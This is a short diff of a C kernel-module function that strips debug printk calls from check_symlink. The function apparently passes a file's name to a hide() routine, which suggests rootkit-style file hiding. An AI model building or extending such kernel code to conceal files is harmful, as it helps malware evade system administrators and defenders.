@@ -70,7 +70,6 @@ int check_symlink(char *path)
 	char *ptr, *name;
 	char delimiter = '/';
 	
-	printk(KERN_INFO "Enter symlink: %s\n", path);
 	ptr = strrchr(path, delimiter);
 	name = ptr + 1;
 	
@@ -79,7 +78,6 @@ int check_symlink(char *path)
 		return 0;
 	}
 
-	printk(KERN_INFO "Exit symlink: %s\n", name);
 	return hide(name);
 }
 
